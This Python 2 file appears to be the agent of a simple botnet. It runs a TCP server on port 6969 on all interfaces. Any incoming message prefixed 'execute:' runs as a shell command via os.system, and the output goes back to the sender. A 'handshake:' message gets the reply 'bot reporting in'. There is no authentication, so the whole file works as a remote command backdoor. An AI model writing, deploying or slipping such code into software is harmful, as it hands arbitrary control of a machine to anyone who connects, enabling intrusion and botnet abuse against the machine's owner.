#import socket
import argparse
import SocketServer
import os
BOT_HOST = ''
BOT_PORT = 6969
# TODO: send message

class Bot(SocketServer.BaseRequestHandler):
    def handle(self):
        self.data = self.request.recv(1024).strip()
        print "client connected: {}".format(self.client_address[0])
        print "client said: {}".format(self.data)
        # just send back the same data, but upper-cased
        # self.request.sendall(self.data.upper())
        if self.data.startswith('execute:'):
            self.data = self.data.split(':')[1]
            os.system(self.data+' > tmp')
            output = open('tmp', 'r').read()
            os.remove('tmp')
        elif self.data.startswith('handshake:'):
            output = "bot reporting in"
        else:
            output = "error: "+self.data
            pass
        print output
        self.request.sendall(output)

if __name__ == '__main__':
    server = SocketServer.TCPServer((BOT_HOST, BOT_PORT), Bot)
    server.serve_forever()
